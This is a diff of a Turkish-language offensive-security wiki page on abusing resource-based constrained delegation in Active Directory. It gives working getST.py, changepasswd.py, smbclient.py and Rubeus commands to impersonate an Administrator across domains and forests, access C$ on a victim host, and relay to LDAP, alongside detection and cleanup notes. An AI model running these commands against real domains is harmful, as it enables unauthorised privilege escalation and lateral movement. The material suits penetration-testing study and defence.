-**Çok etki alanlı ormanlarda** hem **S4U2Self** hem de **S4U2Proxy**, tek bir yönlendirmeden sonra durmak yerine **özyinelemeli** olabilir:
+**Multi-domain forest**'larda hem **S4U2Self** hem de **S4U2Proxy**, tek bir referral sonrasında durmak yerine **recursive** olabilir:
 
-- **Özyinelemeli S4U2Self**: İlk `S4U2Self`, **taklit edilen kullanıcının etki alanına** gönderilir; ara üst/alt etki alanı geçişleri, `krbtgt/<REALM>` için normal `TGS-REQ` yönlendirmeleriyle yapılır ve **son `S4U2Self`**, **delegasyon yapan sorumlunun kendi etki alanında** gönderilir.
-- Bu, yalnızca bir makine hesabına ait **TGT'ye sahip olmanın**, aynı ormandaki başka bir etki alanından bir **yöneticiyi** taklit etmek ve `cifs/host`, `host/host`, `wsman/host` vb. için istek göndermek için yeterli olabileceği anlamına gelir.
-- **Özyinelemeli S4U2Proxy** de güven zincirini aynı şekilde izler: Ara geçişlerde, sonraki `krbtgt/<REALM>` yönlendirmesi istenirken önceki bilet TGT olarak yeniden kullanılır ve yalnızca son geçişte nihai hizmet bileti döndürülür.<sup>[[10]](#references)</sup>
+- **Recursive S4U2Self**: İlk `S4U2Self`, **impersonate edilen kullanıcının etki alanına** gönderilir; ara parent/child geçişleri, `krbtgt/<REALM>` için normal `TGS-REQ` referral'larıyla yapılır ve **son `S4U2Self`**, **delegating principal'ın kendi etki alanına** gönderilir.
+- Bu, yalnızca bir makine hesabı için **TGT**'ye sahip olmanın, aynı forest'taki başka bir etki alanından bir **admin'i impersonate etmek** ve `cifs/host`, `host/host`, `wsman/host` vb. istemek için yeterli olabileceği anlamına gelir.
+- **Recursive S4U2Proxy** de trust chain'i aynı şekilde izler: ara geçişlerde önceki ticket, sonraki `krbtgt/<REALM>` referral'ı istenirken TGT olarak yeniden kullanılır ve yalnızca son geçiş nihai service ticket'ı döndürür.<sup>[[10]](#references)</sup>
 
-Uygulamada aynı orman içindeki bir örnek şöyledir:
+Aynı forest içinde pratik bir örnek:
 
 ```bash
 KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
@@ -251,17 +272,17 @@ KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.loc
   smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
 ```
 
-### SPN'siz etki alanları arası / ormanlar arası RBCD
+### SPN-less cross-domain / cross-forest RBCD
 
-**Delegasyon yapan principal, SPN'si olmayan bir kullanıcıysa**, son özyinelemeli `S4U2Self` isteği **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasıyla başarısız olur. Geçici çözüm, yalnızca son adımı **`S4U2Self+U2U`** olarak yeniden denemektir.<sup>[[10]](#references)</sup>
+**Delegating principal bir SPN'siz kullanıcıysa**, son recursive `S4U2Self` işlemi **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasıyla başarısız olur. Çözüm, **yalnızca son adımı `S4U2Self+U2U` olarak yeniden denemektir**.<sup>[[10]](#references)</sup>
 
-Kötüye kullanım zincirinin kısa özeti:
+Abuse zincirinin kısa hâli:
 
-1. KDC'yi **RC4-HMAC (etype 23)** kullanmaya yönlendirmek için **NT hash** ile kimlik doğrulayın.
+1. KDC'yi **RC4-HMAC'e (etype 23)** yönlendirmek için **NT hash** ile authenticate olun.
 2. Önce **`-self -u2u`** isteğinde bulunun ve bu ticket'ı sonraki proxy adımından ayrı tutun.
-3. `describeTicket.py` ile **TGT oturum anahtarını** çıkarın.
-4. `changepasswd.py -newhashes <session_key>` kullanarak kullanıcının **NT hash** değerini bu **oturum anahtarıyla** değiştirin.
-5. `S4U2Self+U2U` ticket'ını ayrı bir **`-proxy`** isteği sırasında **`-additional-ticket`** olarak yeniden kullanın.
+3. `describeTicket.py` ile **TGT session key**'i çıkarın.
+4. `changepasswd.py -newhashes <session_key>` kullanarak kullanıcının **NT hash**'ini bu **session key** ile değiştirin.
+5. Ayrı bir **`-proxy`** isteği sırasında `S4U2Self+U2U` ticket'ını **`-additional-ticket`** olarak yeniden kullanın.
 
 ```bash
 getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
@@ -276,31 +297,31 @@ KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-
 
 Operasyonel uyarılar:
 
-- **İlk güvenilen atlama noktası zaten başka bir forest ise**, yerel Windows davranışıyla eşleşmesi için **branch-aware** algoritmayı (`getST.py ... -forest`) tercih edin. Yabancı forest zincirde ancak **daha sonra** erişiliyorsa, branch-aware olmayan özyinelemeli akış yine de çalışabilir.<sup>[[9]](#references)</sup>
-- Güncel **Windows Server 2022/2025** DC'lerde, RC4'ün kullanımdan kaldırılması nedeniyle zorunlu RC4 başarısız olabilir ve **`KDC_ERR_ETYPE_NOSUPP`** hatasına yol açabilir; bu, klasik SPN destekli RBCD AES ile çalışmaya devam etse bile **SPN'siz RBCD'yi imkânsız hâle getirebilir**.<sup>[[15]](#references)</sup>
-- Kullanıcının hash/parolasını değiştirmeden önce **`S4U2Self+U2U`** çalıştırın: **`SamrChangePasswordUser`**, hesabın Kerberos AES anahtarlarını **yeniden hesaplamaz**; bu nedenle önce parola değiştirmek sonraki ticket isteklerini bozabilir.<sup>[[14]](#references)</sup>
-- Taklit edilen hesabın hâlâ **delegable** olması gerekir: **Protected Users** ve **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** ayarına sahip hesaplar zinciri engeller.
+- **İlk güvenilen hop zaten başka bir forest ise**, yerel Windows davranışına uygun sonuç almak için **branch-aware** algoritmasını (`getST.py ... -forest`) tercih edin. Yabancı forest'a zincirin yalnızca **daha sonraki** bir aşamasında ulaşılıyorsa, branch-aware olmayan recursive akış yine de işe yarayabilir.<sup>[[9]](#references)</sup>
+- Yakın tarihli **Windows Server 2022/2025** DC'lerde, RC4'ün kullanımdan kaldırılması nedeniyle zorunlu RC4 işlemi **`KDC_ERR_ETYPE_NOSUPP`** hatasıyla başarısız olabilir; bu durumda klasik SPN destekli RBCD AES ile çalışsa bile **SPN'siz RBCD** imkânsız hale gelebilir.<sup>[[15]](#references)</sup>
+- Kullanıcının hash'ini/parolasını değiştirmeden önce **`S4U2Self+U2U`** çalıştırın: **`SamrChangePasswordUser`** hesabın Kerberos AES anahtarlarını **yeniden hesaplamaz**; bu nedenle önce parola değişikliği yapmak sonraki ticket isteklerini bozabilir.<sup>[[14]](#references)</sup>
+- Taklit edilen hesap hâlâ **delegable** olmalıdır: **Protected Users** ve **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** ayarına sahip hesaplar zinciri engeller.
 
-## Tespit / hardening notları
+## Tespit / güçlendirme notları
 
-- Domain/forest'ler arasındaki RBCD yolları genellikle **ACL abuse** veya **relay-to-LDAP** yoluyla oluşturulur. Yaygın kurulum yollarını engellemek için DC'lerde **LDAP signing** ve **LDAP channel binding** uygulayın.
-- Bilgisayar nesnelerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine kimlerin yazabildiğini denetleyin ve **foreign security principals** dâhil olmak üzere kayıtlı SID'leri çözümleyin.
-- Trust yoğun ortamlarında **Selective Authentication**, **SID filtering** ayarlarını ve yabancı bir forest'teki kullanıcıların kaynak host'larda **local admin** haklarına sahip olup olmadığını gözden geçirin.
+- Domain/forest'lar arasındaki RBCD yolları genellikle hâlâ **ACL abuse** veya **relay-to-LDAP** yoluyla oluşturulur. Yaygın kurulum yollarını engellemek için DC'lerde **LDAP signing** ve **LDAP channel binding** zorunlu kılın.
+- Computer nesnelerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` özelliğine kimlerin yazabildiğini denetleyin ve **foreign security principals** dahil depolanan SID'leri çözümlendirin.
+- Trust'ların yoğun olduğu ortamlarda **Selective Authentication**, **SID filtering** ve yabancı bir forest'taki kullanıcıların kaynak host'larda **local admin** haklarına sahip olup olmadığını gözden geçirin.
 
 ### Erişim
 
-Son komut satırı **S4U saldırısının tamamını gerçekleştirecek ve TGS'yi** Administrator'dan kurban host'a **bellekte** enjekte edecektir.\
-Bu örnekte Administrator'dan **CIFS** hizmeti için bir TGS istendiğinden **C$**'ye erişebileceksiniz:
+Son komut satırı **tam S4U saldırısını gerçekleştirir ve Administrator hesabından victim host'a ait TGS'yi belleğe inject eder**.\
+Bu örnekte Administrator hesabından **CIFS** hizmeti için bir TGS istendiğinden **C$**'a erişebilirsiniz:
 
 ```bash
 ls \\victim.domain.local\C$
 ```
 
-### Farklı service ticket'ları kötüye kullanma
+### Farklı service ticket'larını kötüye kullanma
 
-[**Kullanılabilir service ticket'lar hakkında buradan bilgi edinin**](silver-ticket.md#available-services).
+[**Kullanılabilir service ticket'ları hakkında buradan bilgi edinin**](silver-ticket.md#available-services).
 
-## Listeleme, denetleme ve temizleme
+## Sayım, denetim ve temizlik
 
 ### RBCD yapılandırılmış bilgisayarları listeleme
 
@@ -322,14 +343,14 @@ Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
   }
 ```
 
-Impacket (tek bir komutla oku veya temizle):
+Impacket (tek komutla oku veya flush et):
 
 ```bash
 # Read who can delegate to VICTIM
 impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
 ```
 
-### RBCD Temizleme / sıfırlama
+### RBCD'yi temizleme / sıfırlama
 
 - PowerShell (özniteliği temizle):
 
@@ -350,16 +371,12 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 
 ## Kerberos Hataları
 
-- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, Kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'ini sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini sağlayın (ya da yalnızca rc4, aes128 ve aes256 hash'lerini sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-- Normal bir kullanıcı için `-self` sırasında **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: Delegasyon yapan principal'ın muhtemelen **SPN'si yoktur**. Normal bir `S4U2Self` yerine **`S4U2Self+U2U`** kullanarak **son adımı** yeniden deneyin.<sup>[[10]](#references)</sup>
-- **SPN'siz RBCD** sırasında **`KDC_ERR_ETYPE_NOSUPP`**: Yeni DC'ler, `S4U2Self+U2U` + oturum anahtarı değiştirme hilesinin gerektirdiği zorunlu **RC4-HMAC** yolunu reddedebilir. Bunun yerine AES kullanan klasik, **SPN destekli** RBCD yolunu deneyin.<sup>[[10]](#references)[[15]](#references)</sup>
-- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saatinin DC'nin saatinden farklı olduğu ve Kerberos'un düzgün çalışmadığı anlamına gelir.
-- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin oturum açmak için işe yaramadığı anlamına gelir. Hash'leri oluştururken kullanıcı adına `$` eklemeyi unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
-- **`KDC_ERR_BADOPTION`**: Şunlardan biri söz konusu olabilir:
-  - Taklit etmeye çalıştığınız kullanıcı istenen hizmete erişemiyordur (ya onu taklit edemediğiniz ya da yeterli ayrıcalığı olmadığı için).
-  - İstenen hizmet mevcut değildir (örneğin winrm çalışmıyorken winrm için bilet istemeniz).
-  - Oluşturulan sahte bilgisayarın savunmasız sunucu üzerindeki ayrıcalıkları kaldırılmıştır ve bunları geri vermeniz gerekir.
-  - Klasik KCD'yi kötüye kullanıyorsunuzdur; RBCD'nin forwardable olmayan S4U2Self biletleriyle çalıştığını, KCD'nin ise forwardable bilet gerektirdiğini unutmayın.
+- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'i sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini sağlayın (veya RC4, AES128 ve AES256 hash'lerinin tümünü sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- Normal bir kullanıcı için `-self` sırasında görülen **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: delegating principal'ın muhtemelen **SPN'si yoktur**. **Son hop** için normal bir `S4U2Self` yerine **`S4U2Self+U2U`** deneyin.<sup>[[10]](#references)</sup>
+- **SPN'siz RBCD** sırasında görülen **`KDC_ERR_ETYPE_NOSUPP`**: Güncel DC'ler, `S4U2Self+U2U` + session-key-substitution hilesinin gerektirdiği zorunlu **RC4-HMAC** yolunu reddedebilir. Bunun yerine AES kullanan klasik, **SPN destekli** bir RBCD yolu deneyin.<sup>[[10]](#references)[[15]](#references)</sup>
+- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saatinin DC'nin saatinden farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
+- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin oturum açmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+- S4U2Proxy sırasında görülen **`KDC_ERR_BADOPTION`**: Impersonate edilen hesabın delegation kısıtlamalarını, evidence ticket'ın forwardable bayrağını ve classic KCD'nin ya da hedefin RBCD descriptor'ının bu hop'a izin verip vermediğini kontrol edin. Bu bir **KDC delegation-policy hatasıdır**; hedef hizmetin çalışıp çalışmadığını veya kullanıcının uygulama düzeyinde erişimi olup olmadığını test etmez. Kayıtlı olmayan bir hedef SPN normalde bunun yerine **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasına yol açar.<sup>[[21]](#references)[[22]](#references)</sup>
 
 ## Notlar, relay'ler ve alternatifler
 
@@ -370,31 +387,37 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 adws-enumeration.md
 {{#endref}}
 
-- Kerberos relay zincirleri, genellikle tek adımda yerel SYSTEM yetkisi elde etmek için RBCD ile sonlanır. Uçtan uca pratik örnekler için bkz.:
+- Kerberos relay zincirleri, tek adımda yerel SYSTEM elde etmek için sıklıkla RBCD ile sonuçlanır. Uygulamalı uçtan uca örnekler için bkz.:
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
 
-- LDAP signing/channel binding **devre dışıysa** ve bir makine hesabı oluşturabiliyorsanız, **KrbRelayUp** gibi araçlar zorlanmış bir Kerberos kimlik doğrulamasını LDAP'ye relay edebilir, hedef bilgisayar nesnesinde makine hesabınız için `msDS-AllowedToActOnBehalfOfOtherIdentity` ayarını yapabilir ve uzak makineden S4U aracılığıyla hemen **Administrator** kullanıcısını taklit edebilir.<sup>[[8]](#references)</sup>
+- LDAP signing/channel binding **devre dışıysa** ve bir machine account oluşturabiliyorsanız, **KrbRelayUp** gibi araçlar zorlanmış bir Kerberos auth'u LDAP'ye relay edebilir, hedef bilgisayar nesnesindeki `msDS-AllowedToActOnBehalfOfOtherIdentity` değerini machine account'unuz için ayarlayabilir ve host dışından S4U aracılığıyla hemen **Administrator** kimliğine bürünebilir.<sup>[[8]](#references)</sup>
 
 ## References
 
-- [1] [Köpeği Sallamak: Active Directory'ye Saldırmak için Resource-Based Constrained Delegation'ı Kötüye Kullanma](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
-- [2] [Delegasyon Üzerine Bir Söz Daha – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
-- [3] [Kerberos Resource-based Constrained Delegation: Bilgisayar Nesnesini Ele Geçirme](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
+- [1] [Köpeği Kuyruğundan Sallamak: Active Directory'ye Saldırmak için Resource-Based Constrained Delegation'ı Kötüye Kullanma](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
+- [2] [Delegation Üzerine Başka Bir Söz – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
+- [3] [Kerberos Resource-based Constrained Delegation: Computer Object'ın Ele Geçirilmesi](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
 - [4] [Netwrix – Resource-Based Constrained Delegation'ın Kötüye Kullanılması](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
-- [5] [Kerberosity Etki Alanını Bitirdi: Saldırgan Bakış Açısıyla Kerberos'a Genel Bakış](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
-- [6] [Impacket rbcd.py (resmî)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
-- [7] [Güncel sözdizimini içeren hızlı Linux kopya kağıdı](https://tldrbins.github.io/rbcd/)
-- [8] [0xdf – HTB Bruno (LDAP signing devre dışı → Kerberos relay ile RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
-- [9] [Synacktiv - Etki alanları arası ve forest'lar arası RBCD'yi inceleme](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
-- [10] [Synacktiv - Etki alanları arası ve forest'lar arası RBCD'yi inceleme: 2. bölüm](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
-- [11] [Synacktiv Impacket dalı - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
+- [5] [Kerberosity Domain'i Öldürdü: Offensive Kerberos'a Genel Bakış](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+- [6] [Impacket rbcd.py (resmi)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
+- [7] [Güncel sözdizimini içeren kısa Linux cheatsheet'i](https://tldrbins.github.io/rbcd/)
+- [8] [0xdf – HTB Bruno (LDAP signing kapalı → Kerberos relay ile RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
+- [9] [Synacktiv - Cross-domain ve cross-forest RBCD'yi inceleme](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
+- [10] [Synacktiv - Cross-domain ve cross-forest RBCD'yi inceleme: 2. bölüm](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
+- [11] [Synacktiv Impacket branch'i - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
 - [12] [Microsoft Learn - Kerberos constrained delegation'a genel bakış](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
-- [13] [Microsoft Open Specifications - Etki alanları arası S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
+- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
 - [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
-- [15] [Microsoft Learn - Kerberos'ta RC4 kullanımını tespit etme ve giderme](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
+- [15] [Microsoft Learn - Kerberos'ta RC4 kullanımını tespit etme ve düzeltme](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
 - [16] [Microsoft Open Specifications – S4U2Proxy ayrıntıları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
+- [17] [James Forshaw - Normal bir kullanıcı hesabıyla RBCD'yi istismar etme](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
+- [18] [Hunter Wade - SPN'siz hesaplara karşı Protocol Transition olmadan Constrained Delegation'ı kötüye kullanma](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
+- [19] [Sprocket Security - SPN'siz hesaplara karşı Protocol Transition olmadan Constrained Delegation'ı kötüye kullanma](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
+- [20] [Impacket PR #2324 - U2U ile S4U2Proxy](https://github.com/fortra/impacket/pull/2324)
+- [21] [Microsoft MS-SFU - ServicesAllowedToSendForwardedTicketsTo kullanımı](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
+- [22] [Microsoft Learn - Kerberos event logging'i etkinleştirme](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
 {{#include ../../banners/hacktricks-training.md}}
